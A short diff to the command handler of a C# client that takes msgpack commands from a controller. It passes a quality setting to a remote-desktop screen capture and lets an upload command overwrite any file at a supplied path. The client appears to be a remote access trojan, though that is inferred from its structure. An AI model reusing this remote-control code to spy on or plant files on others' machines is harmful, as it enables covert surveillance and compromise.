@@ -97,7 +97,7 @@ namespace Client.Handle_Packet
                                 //case "true":
                                  //   {
                                         HandleRemoteDesktop remoteDesktop = new HandleRemoteDesktop();
-                                        remoteDesktop.CaptureAndSend();
+                                        remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
                                         break;
                                   //  }
                             }
@@ -144,6 +144,11 @@ namespace Client.Handle_Packet
                                 case "uploadFile":
                                     {
                                         string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
+                                        if (File.Exists(fullPath))
+                                        {
+                                            File.Delete(fullPath);
+                                            Thread.Sleep(500);
+                                        }
                                         unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                                         break;
                                     }
